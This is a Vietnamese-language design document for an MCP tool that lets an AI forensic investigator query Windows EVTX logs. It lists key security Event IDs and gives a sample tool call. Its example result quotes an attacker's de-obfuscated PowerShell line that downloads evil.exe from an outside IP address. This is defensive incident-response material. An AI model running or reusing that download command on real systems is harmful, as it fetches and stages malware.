# 30. MCP Tool: EVTX Parser (Windows Event Log Query)

> **Mục tiêu**: Cung cấp giao diện truy vấn có cấu trúc cho AI Investigator để tìm kiếm, phân tích và trích xuất các mốc sự kiện quan trọng trong các file nhật ký Windows (`.evtx`).

---

## 1. Các file EVTX và Event ID trọng yếu trong điều tra

| Kênh Event Log | Event ID | Ý nghĩa nghiệp vụ an ninh |
| :--- | :--- | :--- |
| **Security.evtx** | **4624** | Đăng nhập thành công (Đặc biệt chú ý Logon Type 3: Đăng nhập qua mạng SMB/RPC, Logon Type 10: Remote Desktop). |
| | **4625** | Đăng nhập thất bại (Dấu hiệu Brute-force hoặc Password Spraying). |
| | **4672** | Gán đặc quyền quản trị viên cao cấp (Special Privileges Assigned). |
| | **4720** | Tài khoản người dùng mới được tạo trên hệ thống. |
| **System.evtx** | **7045** | Một dịch vụ mới vừa được cài đặt trên máy trạm (New Service Installed - Persistence). |
| **Sysmon.evtx** | **1** | Tạo tiến trình mới (`ProcessCreate` với dòng lệnh đầy đủ và mã hash). |
| | **3** | Kết nối mạng từ tiến trình (`NetworkConnect`). |
| | **8** | Cấy luồng từ xa (`CreateRemoteThread` - Dấu hiệu Process Injection). |
| | **11** | Tạo file mới (`FileCreate`). |
| | **13** | Sửa đổi giá trị Registry (`RegistryValueSet`). |
| | **22** | Truy vấn phân giải tên miền (`DNSQuery`). |
| **PowerShell/Operational**| **4104** | **Script Block Logging**: Ghi nhận toàn bộ nội dung khối code PowerShell sau khi đã được giải mã chuỗi Base64. |

---

## 2. Giao diện gọi hàm của MCP Tool

```json
{
  "tool": "evtx_query",
  "arguments": {
    "evidence_id": "EVD-20261002-0048",
    "channel": "Microsoft-Windows-PowerShell/Operational",
    "event_id": 4104,
    "time_range": {
      "start": "2026-10-02T10:00:00Z",
      "end": "2026-10-02T10:05:00Z"
    },
    "filter_keyword": "Invoke-WebRequest"
  }
}
```

### Kết quả trả về cho AI:
- Đoạn mã PowerShell thực sự mà kẻ tấn công đã thực thi (sau khi de-obfuscate):
  `IEX (New-Object Net.WebClient).DownloadFile('http://185.220.101.5/evil.exe', 'C:\Users\Public\evil.exe')`
- Giúp AI xác nhận chính xác nguồn gốc tải về của file `evil.exe`.
